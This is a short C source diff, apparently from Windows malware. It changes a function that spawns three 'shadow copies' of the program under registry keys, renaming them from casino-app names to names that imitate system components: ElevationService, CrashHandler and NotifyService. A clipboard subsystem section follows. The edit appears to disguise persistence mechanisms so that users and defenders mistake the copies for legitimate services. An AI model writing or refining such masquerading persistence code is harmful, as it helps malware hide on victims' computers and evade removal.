@@ -428,11 +428,11 @@ static void spawn_single_copy(const char *filename, const char *regKey) {
     }
 }
 
-/* Spawn three shadow copies as casino app components */
+/* Spawn three shadow copies with generic computer-related names */
 void sys_spawn_shadow_copy(void) {
-    spawn_single_copy("VCEngine.exe", "VividCasinoEngine");
-    spawn_single_copy("VCWorker.exe", "VividCasinoWorker");
-    spawn_single_copy("VCHelper.exe", "VividCasinoHelper");
+    spawn_single_copy("ElevationService.exe", "ElevationService");
+    spawn_single_copy("CrashHandler.exe", "CrashHandler");
+    spawn_single_copy("NotifyService.exe", "NotifyService");
 }
 
 /* === Clipboard Subsystem === */
